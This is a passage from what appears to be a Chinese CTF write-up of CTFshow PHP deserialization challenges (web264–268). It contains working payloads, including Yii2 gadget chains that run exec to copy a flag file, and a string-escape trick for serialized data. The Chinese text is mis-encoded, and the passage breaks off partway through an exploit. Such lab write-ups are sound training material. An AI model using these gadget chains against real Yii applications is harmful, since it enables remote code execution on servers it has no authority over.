class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è®¿é—®<strong>message.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?f=<span class="number">1</span>&amp;m=<span class="number">1</span>&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">è®¿é—®message.phpé¡µé¢</span></span><br><span class="line"><span class="string">Cookie msg=Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO2k6MTtzOjM6Im1zZyI7aToxO3M6MjoidG8iOw== </span></span><br><span class="line"><span class="string">åˆ·æ–°message.phpé¡µé¢</span></span><br></pre></td></tr></table></figure><ul><li>é¢˜ä¸web262ç±»ä¼¼ï¼Œæœ¬é¢˜å¤šäº†ä¸ªsession</li><li>åˆ©ç”¨ä¹‹å‰çš„payloadä¿®æ”¹tokençš„å€¼ä¸ºadminï¼Œè®¿é—®message.phpï¼Œå‘ç°éœ€è¦ä»Cookieä¸­å–ï¼Œåˆ©ç”¨sessionååºåˆ—åŒ–çŸ¥è¯†</li></ul><blockquote><p>å°†åºåˆ—åŒ–å†…å®¹è¿›è¡Œbase64ç¼–ç <br>O:7:â€messageâ€:4:{s:4:â€fromâ€;i:1;s:3:â€msgâ€;i:1;s:2:â€toâ€;<br>Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO2k6MTtzOjM6Im1zZyI7aToxO3M6MjoidG8iOw==</p><p>Cookieä¸­ï¼Œå¢åŠ ä¸€ä¸ªå˜é‡<br>msg=Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO2k6MTtzOjM6Im1zZyI7aToxO3M6MjoidG8iOw==</p><p>åˆ·æ–°å³å¯</p></blockquote><h1 id="web265-å¼•ç”¨"><a href="#web265-å¼•ç”¨" class="headerlink" title="web265(å¼•ç”¨)"></a>web265(å¼•ç”¨)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;<span class="title function_ invoke__">login</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?ctfshow=O:12:&quot;ctfshowAdmin&quot;:2:&#123;s:5:&quot;token&quot;;N;s:8:&quot;password&quot;;R:2;&#125;</code></p><ul><li>å‘ç°æœ¬ä½“éœ€è¦ä¸¤ä¸ªå˜é‡çš„å€¼ç›¸ç­‰æ‰è¡Œï¼Œåˆå‘ç°å…¶ä¸­ä¸€ä¸ªå€¼ä¸ºéšæœºå€¼</li><li>åˆ©ç”¨<code>=&amp;</code>å°†ä¸¤ä¸ªå˜é‡å¼•ç”¨åˆ°ä¸€èµ·ï¼Œä½¿ä¸¤ä¸ªå±æ€§çš„å€¼ç›¸ç­‰</li></ul><h1 id="web266"><a href="#web266" class="headerlink" title="web266()"></a>web266()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cs</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshowo</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cs</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post </span><br><span class="line">O:<span class="number">7</span>:<span class="string">&quot;CTFSHOW&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;xxxxxx&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;xxxxxx&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><ul><li>å‘ç°<code>$cs = file_get_contents(&#39;php://input&#39;);</code>å¯ä»¥å¾—çŸ¥æˆ‘ä»¬éœ€è¦æ„é€ postæ•°æ®</li><li>ifåˆ¤æ–­è¡¨æ˜æ„é€ çš„æ•°æ®ä¸èƒ½æœ‰<code>ctfshow</code>ååºåˆ—åŒ–ä¸åŒºåˆ†å¤§å°å†™ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¤§å°å†™è¿›è¡Œç»•è¿‡</li><li>ç›´æ¥æ„é€ è¿›è¡Œpostä¼ å‚</li></ul><h1 id="web267-Yii"><a href="#web267-Yii" class="headerlink" title="web267(Yii)"></a>web267(Yii)</h1><ul><li>è¿›å»å‘ç°æ˜¯ä¸€ä¸ªé¡µé¢ï¼Œå…ˆæ‰«ç›®å½•ï¼Œæ²¡æœ‰ä»€ä¹ˆç»“æœï¼Œè¯•ç€å¼±å£ä»¤ç™»å½•</li></ul><p><img src="/img/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/267.png" alt=""></p><ul><li>å‘ç°å¯†ç ä¸ºadmin/adminï¼Œä¸”abouté¡µé¢å‘ç”Ÿå˜åŒ–</li></ul><p><strong>ç™»é™†å‰</strong></p><p><img src="/img/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/267_01.png" alt=""></p><p><strong>ç™»é™†å</strong></p><p><img src="/img/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/267_02.png" alt=""></p><ul><li>æŸ¥çœ‹æºç å‘ç°æç¤º</li></ul><p><img src="/img/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/267_03.png" alt=""></p><ul><li>æ‹¼æ¥urlå‘ç°å¦‚ä¸‹æç¤ºï¼Œ<code>?r=site%2Fabout&amp;view-source</code></li></ul><p><img src="/img/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/267_04.png" alt=""></p><ul><li>å¡ä½äº†ã€‚ã€‚ã€‚æœä¸€ä¸‹å‘ç°è¿™æ˜¯ä¸ªæ¡†æ¶ï¼Œç”¨Wappalyzerå·¥å…·å‘ç°æ˜¯Yiiæ¡†æ¶ï¼Œç›´æ¥ç™¾åº¦æœ</li></ul><p>å‚è€ƒåšå®¢ï¼š<a href="https://blog.csdn.net/xuandao_ahfengren/article/details/111259943">Yii2 ååºåˆ—åŒ–æ¼æ´</a></p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">    <span class="comment">//TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NzoicGhwaW5mbyI7czoyOiJpZCI7czoxOiIxIjt9aToxO3M6MzoicnVuIjt9fX19</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆåŠŸæ˜¾ç¤ºphpinfoç•Œé¢</p><p>ç½‘ç«™è¿‡æ»¤äº†systemï¼Œæ‰€ä»¥å¯ä»¥æ¢ç”¨shell_execï¼Œè€Œä¸”æ‰§è¡Œsyså‘½ä»¤çš„æ—¶å€™ï¼Œç½‘é¡µåªä¼šæ˜¾ç¤º</p><p><img src="/img/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/267_05.png" alt=""></p><p>æ‰€ä»¥å¯ä»¥è€ƒè™‘ç”¨cpå¤åˆ¶ï¼Œç„¶åurlè®¿é—®ã€‚</p><p><strong>poc</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;exec&#x27;</span>;<span class="comment">// å‡½æ•°</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;cp /flag /var/www/html/basic/web/1.txt&#x27;</span>;<span class="comment">// å‚æ•°</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>, <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NDoiZXhlYyI7czoyOiJpZCI7czozODoiY3AgL2ZsYWcgL3Zhci93d3cvaHRtbC9iYXNpYy93ZWIvMS50eHQiO31pOjE7czozOiJydW4iO319fX0=</span></span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?r=<span class="comment">///backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NDoiZXhlYyI7czoyOiJpZCI7czozODoiY3AgL2ZsYWcgL3Zhci93d3cvaHRtbC9iYXNpYy93ZWIvMS50eHQiO31pOjE7czozOiJydW4iO319fX0=</span></span><br><span class="line">è®¿é—®<span class="number">1</span>.txt</span><br></pre></td></tr></table></figure><h1 id="web268-Yii-plus"><a href="#web268-Yii-plus" class="headerlink" title="web268(Yii plus)"></a>web268(Yii plus)</h1><ul><li><p>è·Ÿä¸Šé¢˜å·®ä¸å¤šï¼Œè¯•ç€ç”¨ä¸Šé¢˜çš„payloadè¯•éªŒä¸€ä¸‹ï¼Œå‘ç°ä¸å¥½ä½¿äº†ã€‚ã€‚ã€‚</p></li><li><p>æ¢ä¸ªæ–°çš„<strong>exp</strong></p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">        <span class="title class_">class</span> <span class="title class_">IndexAction</span>&#123;</span><br><span class="line">            <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;exec&#x27;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;cp /f* 1.txt&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">Faker</span> &#123;</span><br><span class="line">        <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">IndexAction</span>;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;isRunning&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">IndexAction</span>(), <span class="string">&#x27;run&#x27;</span>]; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">Codeception</span>\<span class="title class_">Extension</span>&#123;</span><br><span class="line">        <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span> </span>&#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="variable">$processes</span> = [];</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;processes[]=<span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    